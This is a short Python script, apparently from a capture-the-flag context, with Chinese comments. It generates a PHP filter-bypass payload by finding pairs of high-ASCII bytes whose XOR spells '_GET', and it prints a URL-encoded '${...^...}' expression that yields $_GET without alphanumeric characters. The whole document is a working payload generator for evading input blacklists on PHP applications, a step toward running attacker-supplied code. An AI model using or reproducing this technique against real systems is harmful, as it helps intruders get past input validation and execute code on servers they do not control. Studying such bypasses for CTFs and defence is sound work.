import re
# Python中正则不需要在首位加//
preg = '[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+'
payload = "_GET"
istr = ''
jstr = ''
for char in payload:
    check = 0
    for i in range(128, 256):  #“Use of undefined constant” 视ascii码大于0x7f的字符为字符串，7.2后提出要废弃
        for j in range(128, 256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                if(i ^ j == ord(char)):
                    i = '%{:0>2}'.format(hex(i)[2:])
                    j = '%{:0>2}'.format(hex(j)[2:])
                    istr += i
                    jstr += j
                    check = 1
                    break
        if check == 1:
            break
# php经典特性，没加引号则视为字符串，所以可以不加引号减少字符数
# abc^def等价于(a^d).(b^e).(c^f),前者可以大幅减少字符数
print('${%s^%s}' % (istr, jstr))